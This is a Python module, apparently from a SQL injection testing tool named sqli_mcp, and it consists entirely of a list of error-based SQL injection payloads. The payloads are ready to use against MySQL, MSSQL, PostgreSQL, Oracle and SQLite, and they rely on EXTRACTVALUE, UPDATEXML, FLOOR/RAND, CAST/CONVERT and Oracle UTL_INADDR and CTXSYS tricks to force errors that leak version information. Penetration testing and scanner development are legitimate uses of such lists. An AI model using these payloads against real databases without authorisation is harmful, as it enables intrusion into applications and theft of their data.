"""Error-based SQL injection payloads."""

from sqli_mcp.models import Payload, InjectionType, DatabaseType

ERROR_BASED_PAYLOADS: list[Payload] = [
    # MySQL Error-based
    Payload(
        value="'",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.MYSQL,
        description="Simple quote to trigger syntax error"
    ),
    Payload(
        value="' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)-- -",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.MYSQL,
        description="MySQL error-based using FLOOR/RAND"
    ),
    Payload(
        value="' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- -",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.MYSQL,
        description="MySQL EXTRACTVALUE error injection"
    ),
    Payload(
        value="' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)-- -",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.MYSQL,
        description="MySQL UPDATEXML error injection"
    ),
    Payload(
        value="' AND EXP(~(SELECT * FROM (SELECT VERSION())a))-- -",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.MYSQL,
        description="MySQL EXP overflow error"
    ),
    
    # MSSQL Error-based
    Payload(
        value="' AND 1=CONVERT(int,@@version)-- -",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.MSSQL,
        description="MSSQL CONVERT error injection"
    ),
    Payload(
        value="' AND 1=CAST(@@version AS int)-- -",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.MSSQL,
        description="MSSQL CAST error injection"
    ),
    Payload(
        value="' HAVING 1=1-- -",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.MSSQL,
        description="MSSQL HAVING clause error"
    ),
    
    # PostgreSQL Error-based
    Payload(
        value="' AND 1=CAST(version() AS int)-- -",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.POSTGRESQL,
        description="PostgreSQL CAST error injection"
    ),
    Payload(
        value="'||(SELECT '')||'",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.POSTGRESQL,
        description="PostgreSQL concatenation test"
    ),
    
    # Oracle Error-based
    Payload(
        value="' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.ORACLE,
        description="Oracle UTL_INADDR error injection"
    ),
    Payload(
        value="' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.ORACLE,
        description="Oracle CTXSYS error injection"
    ),
    
    # SQLite Error-based
    Payload(
        value="' AND 1=CAST(sqlite_version() AS int)-- -",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.SQLITE,
        description="SQLite CAST error injection"
    ),
    
    # Generic Error-based
    Payload(
        value="'\"",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.GENERIC,
        description="Quote combination for error detection"
    ),
    Payload(
        value="1'1",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.GENERIC,
        description="Numeric with quote"
    ),
    Payload(
        value="1 AND 1=1",
        injection_type=InjectionType.ERROR_BASED,
        database_type=DatabaseType.GENERIC,
        description="Numeric boolean true"
    ),
]
